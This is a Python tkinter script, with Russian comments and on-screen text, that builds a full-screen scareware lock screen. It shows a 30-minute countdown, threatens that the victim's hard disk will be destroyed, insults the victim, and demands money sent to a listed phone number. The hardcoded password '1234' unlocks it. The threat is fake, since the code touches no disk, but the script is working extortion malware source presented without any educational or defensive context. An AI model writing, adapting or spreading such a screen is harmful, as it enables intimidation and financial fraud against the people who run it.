import tkinter as tk
from tkinter import messagebox
import time

def check_password():
    if password_entry.get() == "1234":
        root.destroy()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль!")
        password_entry.delete(0, tk.END)  # Очищаем поле ввода

def update_timer():
    global remaining_time, blink_state
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        # Мигание текста
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
    else:
        timer_label.config(text="00:00")
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')

# Создаем главное окно
root = tk.Tk()
root.title(" ")
root.attributes('-fullscreen', True)  # Полноэкранный режим
root.configure(bg='black')

# Убираем иконку (крестик в заголовке)
root.overrideredirect(False)  # Оставляем стандартное поведение окна
try:
    root.iconbitmap('')  # Пустая иконка
except:
    pass

# Таймер обратного отсчета (30 минут)
remaining_time = 30 * 60  # 30 минут в секундах

# Метка для таймера
timer_label = tk.Label(
    root,
    text="30:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.place(relx=0.5, rely=0.2, anchor='center')

# Мигающая надпись под таймером
warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.place(relx=0.5, rely=0.3, anchor='center')

# Красный текст по центру
label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте деньги на этот номер: +7 914 234 16 71",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.place(relx=0.5, rely=0.4, anchor='center')

# Поле для пароля
password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20
)
password_entry.place(relx=0.5, rely=0.5, anchor='center')

# Кнопка проверки
button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat'
)
button.place(relx=0.5, rely=0.6, anchor='center')

# Запускаем таймер
update_timer()

root.mainloop()